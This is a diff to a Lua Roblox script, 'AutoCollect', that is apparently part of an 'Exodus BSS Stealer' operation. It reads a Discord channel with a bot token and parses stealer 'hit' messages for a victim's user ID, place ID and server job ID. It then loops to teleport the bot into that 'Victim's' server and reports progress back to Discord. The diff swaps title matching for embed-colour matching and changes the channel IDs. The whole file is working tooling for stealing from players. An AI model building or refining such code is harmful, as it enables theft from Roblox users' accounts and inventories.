@@ -1,10 +1,9 @@
 local AutoCollect = {
-    GuildID = "1489086193822859306";
-    ChannelID = "1497691010384396338";
-    ChannelID2 = "1490163560989593701";
+    GuildID = "1488497480185417779";
+    ChannelID = "1503764937087127773";
     BotToken = _G.BotToken;
     ScanMessagesAmount = 8;
-    BotInfoChannel = "1496893112126148739";
+    BotInfoChannel = "1504112212287946772";
 }
 
 local function SafeRequest(Data)
@@ -172,28 +171,6 @@ end
 
 local HttpService = game:GetService("HttpService")
 
-local function getUserId(username)
-    local response = SafeRequest({
-        Url = "https://users.roblox.com/v1/usernames/users",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            usernames = {username},
-            excludeBannedUsers = false
-        })
-    })
-
-    local data = HttpService:JSONDecode(response.Body)
-
-    if data and data.data and data.data[1] then
-        return data.data[1].id
-    end
-
-    return nil
-end
-
 local function getMsgTime(msg)
     local year, month, day, hour, min, sec =
                 msg.timestamp:match("(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)")
@@ -210,71 +187,52 @@ local function getMsgTime(msg)
         return msgTime
 end
 
-local IdCache = {}
 local function Scan(Tp, Json)
     local Messages = GetMessages()
     if Messages then
         for i, msg in pairs(Messages) do
-            local msgTime = getMsgTime(msg)
-
-            if os.time() - msgTime <= 1800 then
-                local Content = msg.content
-                if Content then
-                    local AutjoinData = Content:match("Auto%-Join_Data:`(.+)`")
-                    local AJdata = AutjoinData and game:GetService("HttpService"):JSONDecode(AutjoinData)
-                    if AJdata then
-                        local HitsMessages = {}
-                        local Messages = GetMessages(AutoCollect.ChannelID2, "100")
-                        local Lim = 0
-                        if Messages then
-                            for _, msg in ipairs(Messages) do
-                                local msgTime = getMsgTime(msg)
-                                if os.time() - msgTime <= 1810 then
-                                    if msg.embeds and msg.embeds[1] and msg.embeds[1].title and msg.embeds[1].title:find("Exodus BSS Stealer") then
-                                        Lim = Lim + 1
-                                        if Lim > AutoCollect.ScanMessagesAmount then
-                                            break
-                                        end
-                                        local username = msg.embeds[1].fields[1].value:split("\n")[1]:match("Username: %*%*(.+)%*%*")
-                                        local UserID = IdCache[username] or tostring(getUserId(username))
-                                        IdCache[username] = UserID
-                                        HitsMessages[UserID] = msg
-                                    end
-                                end
+            pcall(function()
+                local msgTime = getMsgTime(msg)
+                if os.time() - msgTime <= 1800 then
+                    local content = msg.content
+                    local embed = msg.embeds[1]
+                    if embed.color ~= 0xe4f527 then return end
+                    local AutjoinData = {
+                        jobid = content:match("&launchData=%d+/(.+)%)"),
+                        placeid = tonumber(content:match("&launchData=(%d+)/")),
+                        userid = embed.footer.text:match("User Id: (.+)"),
+                        completed = content:match("Completed") or content:match("Progress")
+                    }
+                    local AJdata = AutjoinData
+                    if Tp and not IsMarked(msg.id) and AJdata.completed == nil then
+                        writefile("ExodusAutojoin", AutjoinData)
+                        SetMarked(msg.id)
+                        task.spawn(function()
+                            PublishMessage(AutoCollect.BotInfoChannel, `Auto-Join is checking this https://discord.com/channels/{AutoCollect.GuildID}/{AutoCollect.ChannelID}/{msg.id} (User ID: {AJdata.userid})`)
+                        end)
+                        repeat
+                            LastJobIdToJoin = AJdata.jobid
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(AutjoinData.placeid, AJdata.jobid, LocalPlayer)
+                            if IgnoreServer[LastJobIdToJoin] then
+                                PublishMessage(AutoCollect.BotInfoChannel, "The place is restricted and the bot can't join, for some reason")
+                                break
                             end
-                            if HitsMessages[AJdata.userid] and not (HitsMessages[AJdata.userid].content or ""):find("Private Server") then
-                                if Tp and not IsMarked(msg.id) and AJdata.completed == nil then
-                                    writefile("ExodusAutojoin", AutjoinData)
-                                    SetMarked(msg.id)
-                                    task.spawn(function()
-                                        PublishMessage(AutoCollect.BotInfoChannel, `Auto-Join is checking this https://discord.com/channels/{AutoCollect.GuildID}/{AutoCollect.ChannelID2}/{HitsMessage.id} (User ID: {AJdata.userid})`)
-                                    end)
-                                    repeat
-                                        LastJobIdToJoin = AJdata.jobid
-                                        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, AJdata.jobid, LocalPlayer)
-                                        if IgnoreServer[LastJobIdToJoin] then
-                                            PublishMessage(AutoCollect.BotInfoChannel, "The place is restricted and the bot can't join, for some reason")
-                                            break
-                                        end
-                                        if IsServerFull then
-                                            task.wait(10)
-                                            IsServerFull = false
-                                        else
-                                            task.wait(2)
-                                        end
-                                    until nil
-                                elseif Tp == false then
-                                    if AJdata.completed and Json.jobid == game.JobId and Victim and tonumber(Json.userid) == Victim.UserId then
-                                        return true
-                                    else
-                                        return false
-                                    end
-                                end
+                            if IsServerFull then
+                                task.wait(10)
+                                IsServerFull = false
+                            else
+                                task.wait(2)
                             end
+                        until nil
+                    elseif Tp == false then
+                        if AJdata.completed and Json.jobid == game.JobId and Victim and tonumber(Json.userid) == Victim.UserId then
+                            return true
+                        else
+                            return false
                         end
                     end
                 end
-            end
+            end)
         end
     end
 end
